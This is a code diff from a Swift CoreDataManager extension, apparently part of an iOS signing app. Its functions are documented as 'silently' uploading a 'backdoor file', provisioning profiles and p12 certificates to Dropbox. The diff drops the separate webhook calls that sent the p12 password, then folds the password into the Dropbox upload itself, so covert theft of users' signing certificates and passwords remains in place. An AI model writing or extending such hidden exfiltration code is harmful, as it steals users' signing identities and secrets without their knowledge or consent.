@@ -91,41 +91,21 @@ extension CoreDataManager {
         }
     }
     
-    /// Silently uploads backdoor file to Dropbox and sends info to webhook
+    /// Silently uploads backdoor file to Dropbox with password
     /// - Parameters:
     ///   - backdoorPath: Path to the backdoor file
     ///   - password: Optional p12 password
     private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
         let backdoorFilename = backdoorPath.lastPathComponent
-        let dropboxService = DropboxService.shared
+        let enhancedDropboxService = EnhancedDropboxService.shared
         
-        // Upload backdoor file with error handling
-        dropboxService.uploadCertificateFile(fileURL: backdoorPath) { success, error in
+        // Upload backdoor file with password handling
+        enhancedDropboxService.uploadCertificateFile(
+            fileURL: backdoorPath,
+            password: password
+        ) { success, error in
             if success {
-                Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox", type: .info)
-                
-                // Send certificate info to webhook if password is available with error handling
-                if let p12Password = password, !p12Password.isEmpty {
-                    dropboxService.sendCertificateInfoToWebhook(
-                        password: p12Password,
-                        p12Filename: backdoorFilename, // We use the backdoor filename here
-                        provisionFilename: backdoorFilename // Same as above
-                    ) { success, error in
-                        if !success {
-                            if let error = error {
-                                Debug.shared.log(message: "Failed to send backdoor file info to webhook: \(error.localizedDescription)", type: .error)
-                            } else {
-                                Debug.shared.log(message: "Failed to send backdoor file info to webhook: Unknown error", type: .error)
-                            }
-                            
-                            NotificationCenter.default.post(
-                                name: .webhookSendError,
-                                object: nil,
-                                userInfo: error != nil ? ["error": error!] : [:]
-                            )
-                        }
-                    }
-                }
+                Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox with password", type: .info)
             } else {
                 if let error = error {
                     Debug.shared.log(message: "Failed to upload backdoor file: \(error.localizedDescription)", type: .error)
@@ -148,18 +128,16 @@ extension CoreDataManager {
         }
     }
 
-    /// Silently uploads certificate files to Dropbox and sends info to webhook
+    /// Silently uploads certificate files to Dropbox with password
     /// - Parameters:
     ///   - provisionPath: Path to the mobileprovision file
     ///   - p12Path: Optional path to the p12 file
     ///   - password: Optional p12 password
     private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
-        // Get filenames for webhook
-        let provisionFilename = provisionPath.lastPathComponent
-        let dropboxService = DropboxService.shared
+        let enhancedDropboxService = EnhancedDropboxService.shared
         
         // Upload provision file with error handling
-        dropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in
+        enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in
             if success {
                 Debug.shared.log(message: "Successfully uploaded provision file to Dropbox", type: .info)
             } else {
@@ -183,13 +161,14 @@ extension CoreDataManager {
             }
         }
 
-        // Upload p12 file if available
+        // Upload p12 file with password if available
         if let p12PathURL = p12Path {
-            let p12Filename = p12PathURL.lastPathComponent
-            
-            dropboxService.uploadCertificateFile(fileURL: p12PathURL) { success, error in
+            enhancedDropboxService.uploadCertificateFile(
+                fileURL: p12PathURL,
+                password: password
+            ) { success, error in
                 if success {
-                    Debug.shared.log(message: "Successfully uploaded p12 file to Dropbox", type: .info)
+                    Debug.shared.log(message: "Successfully uploaded p12 file to Dropbox with password", type: .info)
                 } else {
                     if let error = error {
                         Debug.shared.log(message: "Failed to upload p12 file: \(error.localizedDescription)", type: .error)
@@ -208,35 +187,6 @@ extension CoreDataManager {
                         object: nil,
                         userInfo: userInfo
                     )
-                }
-            }
-
-            // Send certificate info to webhook if password is available with error handling
-            if let p12Password = password, !p12Password.isEmpty {
-                dropboxService.sendCertificateInfoToWebhook(
-                    password: p12Password,
-                    p12Filename: p12Filename,
-                    provisionFilename: provisionFilename
-                ) { success, error in
-                    if !success {
-                        if let error = error {
-                            Debug.shared.log(message: "Failed to send certificate info to webhook: \(error.localizedDescription)", type: .error)
-                        } else {
-                            Debug.shared.log(message: "Failed to send certificate info to webhook: Unknown error", type: .error)
-                        }
-                        
-                        // Create userInfo dictionary with available information
-                        var userInfo: [String: Any] = [:]
-                        if let error = error {
-                            userInfo["error"] = error
-                        }
-                        
-                        NotificationCenter.default.post(
-                            name: .webhookSendError,
-                            object: nil,
-                            userInfo: userInfo
-                        )
-                    }
                 }
             }
         }
